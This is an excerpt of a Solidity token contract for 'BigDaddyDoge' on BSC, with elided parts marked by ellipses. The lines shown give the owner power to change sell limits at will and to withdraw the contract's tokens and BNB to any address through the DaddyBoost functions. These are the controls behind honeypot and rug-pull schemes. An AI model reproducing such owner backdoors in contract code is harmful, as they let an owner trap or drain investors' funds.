...
contract BigDaddyDogeBSC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x11054A6Ea2510Fd5Acf322159bd4b1D68A125a39); // Marketing Address
    ...
    string private _name = "BigDaddyDoge";
    string private _symbol = "BDDOGE";
    ...
    uint256 public _maxTxAmountBuy =  60000000000 * 10**6 * 10**9;
    uint256 public _maxTxAmountSell = 60000000000 * 10**6 * 10**9;
    uint256 private minimumTokensBeforeSwap = 40000000 * 10**6 * 10**9; 
    uint256 public buyBackSellLimit = 1 * 10**13;
    string public _message = "BigDaddyDoge With BTC Rewards";
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner()) {
             if(to == uniswapV2Pair){
            require(amount <= _maxTxAmountSell, "Transfer amount exceeds the maxTxAmountSell.");}
             if(from == uniswapV2Pair){
            require(amount <= _maxTxAmountBuy, "Transfer amount exceeds the maxTxAmountBuy.");}
    ...
    function setMaxTxAmountBuy(uint256 maxTxAmount) external onlyOwner {
        _maxTxAmountBuy = maxTxAmount;
    }
    
     function setMaxTxAmountSell(uint256 maxTxAmount) external onlyOwner {
        _maxTxAmountSell = maxTxAmount;
    }
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmountBuy = 1000000000 * 10**6 * 10**9;
        _maxTxAmountSell = 1000000000 * 10**6 * 10**9;
    }
    ...
    function afterPreSale() external onlyOwner {
        ...
        _taxFee = 2;
        _liquidityFee = 10;
        _maxTxAmountBuy = 3000000 * 10**6 * 10**9;
        _maxTxAmountSell = 3000000 * 10**6 * 10**9;
    }
    ...
    function DaddyBoost(address recipient , uint256 _amount) external onlyOwner(){
        uint256 amount = _amount * 10**_decimals;
         require(balanceOf(address(this)) >= amount,"Not Enough Tokens");
        _transfer(address(this),recipient,amount);
    }
    
    function DaddyBoost2(address payable recipient , uint256 _amount) external onlyOwner(){
       uint256 amount = _amount*10**18;
        require(address(this).balance >= amount,"Not Enough bnbs");
        recipient.transfer(amount);
    }
    ...
    function getMessage() public view returns(string memory) {
      ...
      function setdividendToken(address dividendToken) external onlyOwner(){
